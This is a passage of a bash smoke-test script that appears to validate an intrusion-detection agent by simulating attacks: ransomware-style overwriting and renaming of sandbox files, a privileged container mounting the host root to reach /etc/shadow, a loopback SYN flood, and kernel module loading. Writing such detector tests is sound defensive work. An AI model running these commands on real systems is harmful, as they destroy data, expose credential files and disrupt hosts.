    mark_skip "data_exfiltration" "loopback may be excluded"
  fi
}

#### Legacy detectors — Impact ####

test_ransomware() {
  # Write entropy burst + rename pattern. Simulate by writing random
  # data over many files then renaming with a `.locked` extension.
  for i in $(seq 1 60); do
    head -c 4096 /dev/urandom > "$SANDBOX/file_$i.txt"
  done
  for i in $(seq 1 60); do
    mv "$SANDBOX/file_$i.txt" "$SANDBOX/file_$i.txt.locked"
  done
  if wait_for_incident "ransomware"; then
    mark_pass "ransomware"
  else
    mark_fail "ransomware" "no incident"
  fi
}

#### Legacy detectors — Infra ####

test_docker_anomaly() {
  if ! command -v docker &>/dev/null || ! docker info &>/dev/null; then
    mark_skip "docker_anomaly" "docker not available"
    return
  fi
  # Spin a container that gets OOM-killed.
  docker run --rm --memory 4m --oom-kill-disable=false alpine sh -c 'dd if=/dev/zero of=/dev/null bs=1M count=100' >/dev/null 2>&1 || true
  if wait_for_incident "docker_anomaly"; then
    mark_pass "docker_anomaly"
  else
    mark_skip "docker_anomaly" "OOM may not have fired in container"
  fi
}

test_cgroup_abuse() {
  # Sustained CPU spike via tight python loop.
  if ! command -v python3 &>/dev/null; then
    mark_skip "cgroup_abuse" "python3 not installed"
    return
  fi
  ( timeout 8 python3 -c 'while True: pass' >/dev/null 2>&1 ) &
  ( timeout 8 python3 -c 'while True: pass' >/dev/null 2>&1 ) &
  wait
  if wait_for_incident "cgroup_abuse" 15; then
    mark_pass "cgroup_abuse"
  else
    mark_skip "cgroup_abuse" "needs cgroups v2 + threshold tuning"
  fi
}

test_kernel_module_load() {
  # Try to load a benign module that's probably not currently loaded.
  if ! command -v modprobe &>/dev/null; then
    mark_skip "kernel_module_load" "modprobe not available"
    return
  fi
  local mod="dummy"
  if lsmod | grep -q "^${mod} "; then
    mark_skip "kernel_module_load" "$mod already loaded"
    return
  fi
  sudo modprobe "$mod" 2>/dev/null || { mark_skip "kernel_module_load" "modprobe failed (mod missing or signed-only)"; return; }
  if wait_for_incident "kernel_module_load"; then
    mark_pass "kernel_module_load"
  else
    mark_fail "kernel_module_load" "no incident"
  fi
  sudo rmmod "$mod" 2>/dev/null || true
}

test_integrity_alert() {
  # Modify a tracked file. If `integrity` collector is sweeping
  # /etc/passwd, this should drift.
  sudo bash -c "echo '# iw smoke integrity marker' >> /etc/issue"
  sleep 5
  if wait_for_incident "integrity_alert" 30; then
    mark_pass "integrity_alert"
  else
    mark_skip "integrity_alert" "integrity collector may not watch /etc/issue or sweep is slow"
  fi
  sudo sed -i '/# iw smoke integrity marker/d' /etc/issue
}

test_container_drift() {
  if ! command -v docker &>/dev/null || ! docker info &>/dev/null; then
    mark_skip "container_drift" "docker not available"
    return
  fi
  docker run --rm alpine sh -c 'apk add --no-cache curl 2>/dev/null; echo test > /usr/bin/iw_smoke_drift' >/dev/null 2>&1 || true
  if wait_for_incident "container_drift"; then
    mark_pass "container_drift"
  else
    mark_skip "container_drift" "no overlayfs upper-layer event observed"
  fi
}

test_container_escape() {
  if ! command -v docker &>/dev/null || ! docker info &>/dev/null; then
    mark_skip "container_escape" "docker not available"
    return
  fi
  # Privileged container with /proc/sys mounted — escape indicator.
  docker run --rm --privileged -v /:/host alpine sh -c 'ls /host/etc/shadow >/dev/null' 2>/dev/null || true
  if wait_for_incident "container_escape"; then
    mark_pass "container_escape"
  else
    mark_skip "container_escape" "may need active overlay/privileged detection wired"
  fi
}

test_mitre_hunt() {
  # T1222.002: chmod 777 on a sensitive path triggers mitre_hunt.
  sudo cp /etc/issue "$SANDBOX/iw_smoke_chmod_target"
  sudo chmod 777 "$SANDBOX/iw_smoke_chmod_target"
  if wait_for_incident "mitre_hunt"; then
    mark_pass "mitre_hunt"
  else
    mark_skip "mitre_hunt" "may need different technique trigger"
  fi
}

test_threat_intel() {
  mark_skip "threat_intel" "needs VirusTotal API + known-bad hash exec — out of scope"
}

test_stego_detect() {
  mark_skip "stego_detect" "complex LSB image — out of scope for safe smoke"
}

test_rootkit() {
  mark_skip "rootkit" "kernel syscall-table tamper requires malicious LKM"
}

test_packet_flood() {
  if ! command -v hping3 &>/dev/null; then
    mark_skip "packet_flood" "hping3 not installed"
    return
  fi
  sudo timeout 3 hping3 -S --flood -p 80 127.0.0.1 >/dev/null 2>&1 || true
  if wait_for_incident "packet_flood"; then
    mark_pass "packet_flood"
  else
    mark_skip "packet_flood" "loopback flood may not register"
  fi
}

test_io_uring_anomaly() {
  mark_skip "io_uring_anomaly" "needs liburing-aware test program"
}

test_host_drift() {
  mark_skip "host_drift" "needs baseline + sysctl change over slow loop"
}

test_sandbox_evasion() {
  # Probe CPUID via cpuid tool if present (typical sandbox-detection technique).
  if ! command -v cpuid &>/dev/null; then
    mark_skip "sandbox_evasion" "cpuid tool not installed"
    return
  fi
  cpuid -1 >/dev/null 2>&1 || true
  if wait_for_incident "sandbox_evasion"; then
    mark_pass "sandbox_evasion"
  else
    mark_skip "sandbox_evasion" "single CPUID may not pass threshold"
  fi
}

#### Correlation chain probes (spec 050-PR7) ####

test_chain_cl_051_discovery_to_privesc() {
  # Run discovery, then privesc — should fire CL-051 in the agent.
  test_nmap_scan
  test_setuid_exploit_pattern
  if wait_for_incident "CL-051" 20; then
    mark_pass "CL-051.chain"
  else
    mark_fail "CL-051.chain" "chain did not fire — check correlation_engine logs"
  fi
}

test_chain_cl_055_persistence_to_evasion() {
  test_pam_module_change
  test_auditd_disable
  if wait_for_incident "CL-055" 20; then
    mark_pass "CL-055.chain"
  else
    mark_fail "CL-055.chain" "chain did not fire"
  fi
}

test_chain_cl_056_evasion_to_impact() {
  test_auditd_disable
  test_rm_rf_user_data
  if wait_for_incident "CL-056" 20; then
    mark_pass "CL-056.chain"
  else
    mark_fail "CL-056.chain" "chain did not fire"
  fi
}

# ─── runner ──────────────────────────────────────────────────────────
main() {
  setup

  # ── Run user_creation first so setup's useradd counts as the trigger.
  header "Legacy: Initial Access + Foothold"
  test_user_creation
  test_ssh_bruteforce
  test_credential_stuffing
  test_distributed_ssh
  test_web_scan
  test_user_agent_scanner
  test_web_shell

  header "Legacy: Execution"
  test_reverse_shell
  test_fileless
  test_process_injection
  test_crypto_miner
  test_execution_guard

  header "Legacy: Persistence"
  test_crontab_persistence
  test_systemd_persistence
  test_ssh_key_injection

  header "Legacy: Privilege Escalation"
  test_sudo_abuse
  test_privesc

  header "Legacy: Defense Evasion"
  test_log_tampering
  test_data_encoding
  test_process_tree
  test_yara_scan
  test_sigma_rule
  test_integrity_alert
  test_mitre_hunt
  test_rootkit
  test_host_drift
  test_sandbox_evasion

  header "Legacy: Credential Access"
  test_credential_harvest
  test_search_abuse
  test_sensitive_write

  header "Legacy: Discovery"
  test_port_scan
  test_discovery_burst
  test_suspicious_login

  header "Legacy: C2 + Exfiltration"
  test_dns_tunneling
  test_dns_c2
  test_c2_callback
  test_outbound_anomaly
  test_data_exfiltration
  test_stego_detect

  header "Legacy: Impact"
  test_ransomware
  test_packet_flood

  header "Legacy: Infra (Docker / cgroup / kmod / etc.)"
  test_docker_anomaly
  test_cgroup_abuse
  test_kernel_module_load
  test_container_drift
  test_container_escape
  test_io_uring_anomaly
  test_threat_intel

  header "spec 050-PR1 (Discovery)"
  test_nmap_scan
  test_wordlist_scan
  test_discovery_anomaly

  header "spec 050-PR2 (Collection)"
  test_clipboard_read
  test_screen_capture
  test_archive_pwd_protected
  test_automated_file_collection
  test_keylogger_bash_trap

  header "spec 050-PR3 (C2)"
  test_c2_web_tunnel
  test_c2_protocol_tunneling
  test_c2_non_standard_port

  header "spec 050-PR4 (Privesc + Lateral)"
  test_setuid_exploit_pattern
  test_capabilities_abuse
  test_lateral_egress_ssh
  test_lateral_egress_scp_rsync

  header "spec 050-PR5 (Persistence + Defense Evasion)"
  test_pam_module_change
  test_auditd_disable
  test_selinux_apparmor_disable
  test_startup_script_persistence

  header "spec 050-PR6 (Impact)"
  test_rm_rf_user_data
  test_disk_wipe_loop
  test_shred_burst
  test_mkfs_loop
  test_luksformat_loop

  header "spec 050-PR7 (Correlation chains — selected)"
  test_chain_cl_051_discovery_to_privesc
  test_chain_cl_055_persistence_to_evasion
  test_chain_cl_056_evasion_to_impact

  # ─── summary ──────────────────────────────────────────────────────
  header "summary"
  for name in "${!RESULTS[@]}"; do
    printf '  %-50s %s\n' "$name" "${RESULTS[$name]}"
  done | sort

  printf '\nPASS=%d  FAIL=%d  SKIP=%d\n' "$PASS" "$FAIL" "$SKIP"
  printf 'Log: %s\n' "$LOG"

  [ "$FAIL" -eq 0 ]
}

main "$@" | tee "$LOG"
